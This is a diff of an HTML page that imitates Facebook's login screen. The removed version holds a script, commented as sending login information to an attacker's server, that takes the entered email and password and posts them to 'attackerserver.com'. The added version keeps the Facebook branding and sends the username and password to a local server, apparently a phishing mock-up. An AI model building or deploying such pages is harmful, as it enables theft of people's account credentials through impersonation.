@@ -1,33 +1,32 @@
 <!DOCTYPE html>
 <html>
-<head>
-	<title>Facebook Login</title>
-	<meta charset="UTF-8">
-	<meta name="viewport" content="width=device-width, initial-scale=1.0">
-</head>
-<body>
+  <head>
+    <meta charset="UTF-8">
+    <title>Facebook Login</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  </head>
 
-	<form>
-		<label for="email">Email:</label><br>
-		<input type="email" id="email" name="email"><br>
-		<label for="password">Password:</label><br>
-		<input type="password" id="password" name="password"><br>
-		<input type="submit" value="Log In">
-	</form>
-
-	<script>
-		// Send login information to attacker's server
-		const form = document.querySelector('form');
-		form.addEventListener('submit', (event) => {
-			event.preventDefault();
-			const email = document.getElementById('email').value;
-			const password = document.getElementById('password').value;
-			const request = new XMLHttpRequest();
-			request.open('POST', 'http://attackerserver.com', true);
-			request.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');
-			request.send(`email=${email}&password=${password}`);
-		});
-	</script>
-
-</body>
+  <body>
+    <div class="container">
+      <div class="logo">
+        <img src="https://i.imgur.com/UrqvJjT.png" alt="Facebook Logo">
+      </div>
+      <form>
+        <input type="text" id="username" placeholder="Email address or phone number">
+        <input type="password" id="password" placeholder="Password">
+        <button type="button" onclick="login()">Log In</button>
+      </form>
+    </div>
+    
+    <script>
+      function login() {
+        var username = $("#username").val();
+        var password = $("#password").val();
+        $.post("http://localhost:8000/login", {username: username, password: password}, function(data) {
+          alert(data);
+        });
+      }
+    </script>
+  </body>
 </html>
